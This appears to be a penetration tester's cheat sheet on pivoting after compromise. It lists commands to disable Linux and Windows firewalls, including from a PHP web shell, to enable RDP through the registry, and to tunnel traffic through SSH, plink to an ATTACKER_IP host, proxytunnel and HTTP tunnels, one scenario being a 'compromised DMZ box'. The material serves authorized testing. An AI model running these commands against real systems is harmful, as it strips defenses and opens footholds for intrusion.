# Pivoting and network on target


## Tunneling your traffic through another host : https://guide.offsecnewbie.com/network-pen

## Linux: Disable firewall

    systemctl stop firewalld
    iptables -F

## Windows: Disable firewall

    Check firewall state: netsh firewall show state
    Turn off through PHP web shell: system(‘netsh firewall show state’);
    Turn firewall off: netsh advfirewall set allprofiles state off
    netsh firewall set opmode disable


## Enable RDP through the command line
    reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
    if terminal services are disabled: sc config TermService start= "demand"
    net start TermService
    
# Port Forwarding / SSH Tunneling
## SSH: Local Port Forwarding
````
# Listen on local port 8080 and forward incoming traffic to REMOT_HOST:PORT via SSH_SERVER
# Scenario: access a host that's being blocked by a firewall via SSH_SERVER;
ssh -L 127.0.0.1:8080:REMOTE_HOST:PORT user@SSH_SERVER
````
## SSH: Dynamic Port Forwarding

````
# Listen on local port 8080. Incoming traffic to 127.0.0.1:8080 forwards it to final destination via SSH_SERVER
# Scenario: proxy your web traffic through SSH tunnel OR access hosts on internal network via a compromised DMZ box;
ssh -D 127.0.0.1:8080 user@SSH_SERVER
````
## SSH: Remote Port Forwarding
````
# Open port 5555 on SSH_SERVER. Incoming traffic to SSH_SERVER:5555 is tunneled to LOCALHOST:3389
# Scenario: expose RDP on non-routable network;
ssh -R 5555:LOCAL_HOST:3389 user@SSH_SERVER
plink -R ATTACKER:ATTACKER_PORT:127.0.01:80 -l root -pw pw ATTACKER_IP
````

## Proxy Tunnel
````
# Open a local port 127.0.0.1:5555. Incoming traffic to 5555 is proxied to DESTINATION_HOST through PROXY_HOST:3128
# Scenario: a remote host has SSH running, but it's only bound to 127.0.0.1, but you want to reach it;
proxytunnel -p PROXY_HOST:3128 -d DESTINATION_HOST:22 -a 5555
ssh user@127.0.0.1 -p 5555
````
## HTTP Tunnel: SSH Over HTTP
````

# Server - open port 80. Redirect all incoming traffic to localhost:80 to localhost:22
hts -F localhost:22 80

# Client - open port 8080. Redirect all incoming traffic to localhost:8080 to 192.168.1.15:80
htc -F 8080 192.168.1.15:80

# Client - connect to localhost:8080 -> get tunneled to 192.168.1.15:80 -> get redirected to 192.168.1.15:22
ssh localhost -p 8080
````
